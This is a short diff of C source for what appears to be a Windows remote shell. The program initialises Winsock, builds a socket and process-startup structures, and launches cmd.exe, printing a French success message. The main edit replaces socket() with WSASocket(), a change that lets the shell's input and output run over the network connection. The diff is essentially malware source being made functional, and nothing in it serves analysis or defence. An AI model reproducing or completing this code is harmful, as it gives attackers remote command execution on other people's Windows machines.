@@ -8,7 +8,7 @@ int main(){
     char command[] = "cmd.exe";
     WSADATA wsa;
     WSAStartup(MAKEWORD(2,2), &wsa);
-    SOCKET soc = socket(AF_INET, SOCK_STREAM, 0);
+    SOCKET soc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     SOCKADDR_IN server;
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
@@ -50,7 +50,7 @@ int main(){
     }
     printf("[+] CMD.exe lance avec succes. En attente...\n");
 
-    
+
     WaitForSingleObject(pinfo.hProcess, INFINITE);
     // cleanup
     closesocket(soc);
